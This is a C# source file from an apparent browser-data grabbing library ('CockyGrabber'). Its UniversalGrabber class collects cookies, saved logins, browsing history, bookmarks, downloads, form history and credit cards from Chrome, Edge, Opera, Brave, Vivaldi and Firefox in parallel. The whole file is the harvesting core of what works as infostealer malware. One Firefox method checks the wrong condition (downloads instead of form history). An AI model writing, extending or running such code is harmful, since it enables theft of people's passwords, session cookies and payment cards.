using System.Collections.Generic;
using System.Threading.Tasks;

namespace CockyGrabber.Grabbers
{
    public class UniversalGrabber
    {
        public BlinkGrabber[] BlinkGrabbers =
        {
            new ChromeGrabber(),
            new EdgeGrabber(),
            new OperaGxGrabber(),
            new OperaGrabber(),
            new BraveGrabber(),
            new VivaldiGrabber(),
        };
        public GeckoGrabber[] GeckoGrabbers =
        {
            new FirefoxGrabber(),
        };

        #region GetCookies()
        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.Cookie.Header by, string value)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Cookies from all BlinkGrabbers at the same time (parallel):
            {
                // Add cookies to list if they exist:
                if (g.AnyCookiesExist() && g.KeyExists())
                    cookies.AddRange(g.GetCookiesBy(by, value));
            });

            return cookies;
        }
        public IEnumerable<Blink.Cookie> GetAllBlinkCookies()
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Cookies from all BlinkGrabbers at the same time (parallel):
            {
                // Add the cookies to the list if they exist:
                if (g.AnyCookiesExist() && g.KeyExists())
                    cookies.AddRange(g.GetCookies());
            });

            return cookies;
        }

        public IEnumerable<Gecko.Cookie> GetAllGeckoCookiesBy(Gecko.Cookie.Header by, string value)
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Cookies from all GeckoGrabbers at the same time (parallel):
            {
                // Add the cookies to the list if they exist:
                if (g.AnyCookiesExist())
                    cookies.AddRange(g.GetCookiesBy(by, value));
            });

            return cookies;
        }
        public IEnumerable<Gecko.Cookie> GetAllGeckoCookies()
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Cookies from all GeckoGrabbers at the same time (parallel):
            {
                // Add the cookies to the list if they exist:
                if (g.AnyCookiesExist())
                    cookies.AddRange(g.GetCookies());
            });

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.Login.Header by, string value)
        {
            List<Blink.Login> logins = new List<Blink.Login>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Logins from all BlinkGrabbers at the same time (parallel):
            {
                // Add the logins to the list if they exist:
                if (g.AnyLoginsExist() && g.KeyExists())
                    logins.AddRange(g.GetLoginsBy(by, value));
            });

            return logins;
        }
        public IEnumerable<Blink.Login> GetAllBlinkLogins()
        {
            List<Blink.Login> logins = new List<Blink.Login>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Logins from all BlinkGrabbers at the same time (parallel):
            {
                // Add the logins to the list if they exist:
                if (g.AnyLoginsExist() && g.KeyExists())
                    logins.AddRange(g.GetLogins());
            });

            return logins;
        }

        public IEnumerable<Gecko.Login> GetAllGeckoLoginsBy(Gecko.Login.Header by, string value)
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Logins from all GeckoGrabbers at the same time (parallel):
            {
                // Add the logins to the list if they exist:
                if (g.AnyLoginsExist())
                    logins.AddRange(g.GetLoginsBy(by, value));
            });

            return logins;
        }
        public IEnumerable<Gecko.Login> GetAllGeckoLogins()
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Logins from all GeckoGrabbers at the same time (parallel):
            {
                // Add the logins to the list if they exist:
                if (g.AnyLoginsExist())
                    logins.AddRange(g.GetLogins());
            });

            return logins;
        }
        #endregion

        #region GetHistories()
        public IEnumerable<Blink.Site> GetAllBlinkHistoriesBy(Blink.Site.Header by, string value)
        {
            List<Blink.Site> sites = new List<Blink.Site>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Histories from all BlinkGrabbers at the same time (parallel):
            {
                // Add the history to the list if it exists:
                if (g.AnyHistoryExists())
                    sites.AddRange(g.GetHistoryBy(by, value));
            });

            return sites;
        }
        public IEnumerable<Blink.Site> GetAllBlinkHistories()
        {
            List<Blink.Site> sites = new List<Blink.Site>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Histories from all BlinkGrabbers at the same time (parallel):
            {
                // Add the history to the list if it exists:
                if (g.AnyHistoryExists())
                    sites.AddRange(g.GetHistory());
            });

            return sites;
        }

        public IEnumerable<Gecko.Site> GetAllGeckoHistoriesBy(Gecko.Site.Header by, string value)
        {
            List<Gecko.Site> sites = new List<Gecko.Site>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Histories from all GeckoGrabbers at the same time (parallel):
            {
                // Add the history to the list if it exists:
                if (g.AnyHistoryExists())
                    sites.AddRange(g.GetHistoryBy(by, value));
            });

            return sites;
        }
        public IEnumerable<Gecko.Site> GetAllGeckoHistories()
        {
            List<Gecko.Site> sites = new List<Gecko.Site>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Histories from all GeckoGrabbers at the same time (parallel):
            {
                // Add the history to the list if it exists:
                if (g.AnyHistoryExists())
                    sites.AddRange(g.GetHistory());
            });

            return sites;
        }
        #endregion

        #region GetBookmarks()
        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarksBy(Blink.Bookmark.Header by, string value)
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Bookmarks from all BlinkGrabbers at the same time (parallel):
            {
                // Add the bookmarks to the list if they exist:
                if (g.AnyBookmarksExist())
                    bookmarks.AddRange(g.GetBookmarksBy(by, value));
            });

            return bookmarks;
        }
        public IEnumerable<Blink.Bookmark> GetAllBlinkBookmarks()
        {
            List<Blink.Bookmark> bookmarks = new List<Blink.Bookmark>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Bookmarks from all BlinkGrabbers at the same time (parallel):
            {
                // Add the bookmarks to the list if they exist:
                if (g.AnyBookmarksExist())
                    bookmarks.AddRange(g.GetBookmarks());
            });

            return bookmarks;
        }

        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarksBy(Gecko.Bookmark.Header by, string value)
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Bookmarks from all GeckoGrabbers at the same time (parallel):
            {
                // Add the bookmarks to the list if they exist:
                if (g.AnyBookmarksExist())
                    bookmarks.AddRange(g.GetBookmarksBy(by, value));
            });

            return bookmarks;
        }
        public IEnumerable<Gecko.Bookmark> GetAllGeckoBookmarks()
        {
            List<Gecko.Bookmark> bookmarks = new List<Gecko.Bookmark>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Bookmarks from all GeckoGrabbers at the same time (parallel):
            {
                // Add the bookmarks to the list if they exist:
                if (g.AnyBookmarksExist())
                    bookmarks.AddRange(g.GetBookmarks());
            });

            return bookmarks;
        }
        #endregion

        #region GetDownloads()
        public IEnumerable<Blink.Download> GetAllBlinkDownloadsBy(Blink.Download.Header by, string value)
        {
            List<Blink.Download> downloads = new List<Blink.Download>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Downloads from all BlinkGrabbers at the same time (parallel):
            {
                // Add the downloads to the list if they exist:
                if (g.AnyDownloadsExist())
                    downloads.AddRange(g.GetDownloadsBy(by, value));
            });

            return downloads;
        }
        public IEnumerable<Blink.Download> GetAllBlinkDownloads()
        {
            List<Blink.Download> downloads = new List<Blink.Download>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Downloads from all BlinkGrabbers at the same time (parallel):
            {
                // Add the downloads to the list if they exist:
                if (g.AnyDownloadsExist())
                    downloads.AddRange(g.GetDownloads());
            });

            return downloads;
        }

        public IEnumerable<Gecko.Download> GetAllGeckoDownloadsBy(Gecko.Download.Header by, string value)
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Downloads from all GeckoGrabbers at the same time (parallel):
            {
                // Add the downloads to the list if they exist:
                if (g.AnyDownloadsExist())
                    downloads.AddRange(g.GetDownloadsBy(by, value));
            });

            return downloads;
        }
        public IEnumerable<Gecko.Download> GetAllGeckoDownloads()
        {
            List<Gecko.Download> downloads = new List<Gecko.Download>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Downloads from all GeckoGrabbers at the same time (parallel):
            {
                // Add the downloads to the list if they exist:
                if (g.AnyDownloadsExist())
                    downloads.AddRange(g.GetDownloads());
            });

            return downloads;
        }
        #endregion

        #region GetFormHistories()
        public IEnumerable<Blink.Form> GetAllBlinkFormHistoriesBy(Blink.Form.Header by, string value)
        {
            List<Blink.Form> forms = new List<Blink.Form>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Form Histories from all BlinkGrabbers at the same time (parallel):
            {
                // Add the forms to the list if they exist:
                if (g.AnyWebDataExists())
                    forms.AddRange(g.GetFormHistoryBy(by, value));
            });

            return forms;
        }
        public IEnumerable<Blink.Form> GetAllBlinkFormHistories()
        {
            List<Blink.Form> forms = new List<Blink.Form>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Form Histories from all BlinkGrabbers at the same time (parallel):
            {
                // Add the forms to the list if they exist:
                if (g.AnyWebDataExists())
                    forms.AddRange(g.GetFormHistory());
            });

            return forms;
        }

        public IEnumerable<Gecko.Form> GetAllGeckoFormHistoriesBy(Gecko.Form.Header by, string value)
        {
            List<Gecko.Form> forms = new List<Gecko.Form>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Form Histories from all GeckoGrabbers at the same time (parallel):
            {
                // Add the forms to the list if they exist:
                if (g.AnyFormHistoryExists())
                    forms.AddRange(g.GetFormHistoryBy(by, value));
            });

            return forms;
        }
        public IEnumerable<Gecko.Form> GetAllGeckoFormHistories()
        {
            List<Gecko.Form> forms = new List<Gecko.Form>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Form Histories from all GeckoGrabbers at the same time (parallel):
            {
                // Add the forms to the list if they exist:
                if (g.AnyDownloadsExist())
                    forms.AddRange(g.GetFormHistory());
            });

            return forms;
        }
        #endregion

        #region GetCreditCards()
        public IEnumerable<Blink.CreditCard> GetAllBlinkCreditCardsBy(Blink.CreditCard.Header by, string value)
        {
            List<Blink.CreditCard> ccs = new List<Blink.CreditCard>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Credit Cards from all BlinkGrabbers at the same time (parallel):
            {
                // Add the credit cards to the list if they exist:
                if (g.AnyWebDataExists() && g.KeyExists())
                    ccs.AddRange(g.GetCreditCardsBy(by, value));
            });

            return ccs;
        }
        public IEnumerable<Blink.CreditCard> GetAllBlinkCreditCards()
        {
            List<Blink.CreditCard> ccs = new List<Blink.CreditCard>();
            Parallel.ForEach(BlinkGrabbers, g => // Get Credit Cards from all BlinkGrabbers at the same time (parallel):
            {
                // Add the credit cards to the list if they exist:
                if (g.AnyWebDataExists() && g.KeyExists())
                    ccs.AddRange(g.GetCreditCards());
            });

            return ccs;
        }

        public IEnumerable<Gecko.CreditCard> GetAllGeckoCreditCardsBy(Gecko.CreditCard.Header by, string value)
        {
            List<Gecko.CreditCard> ccs = new List<Gecko.CreditCard>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Credit Cards from all GeckoGrabbers at the same time (parallel):
            {
                // Add the credit cards to the list if they exist:
                if (g.AnyAutoFillProfilesExists())
                    ccs.AddRange(g.GetCreditCardsBy(by, value));
            });

            return ccs;
        }
        public IEnumerable<Gecko.CreditCard> GetAllGeckoCreditCards()
        {
            List<Gecko.CreditCard> ccs = new List<Gecko.CreditCard>();
            Parallel.ForEach(GeckoGrabbers, g => // Get Credit Cards from all GeckoGrabbers at the same time (parallel):
            {
                // Add the credit cards to the list if they exist:
                if (g.AnyAutoFillProfilesExists())
                    ccs.AddRange(g.GetCreditCards());
            });

            return ccs;
        }
        #endregion
    }
}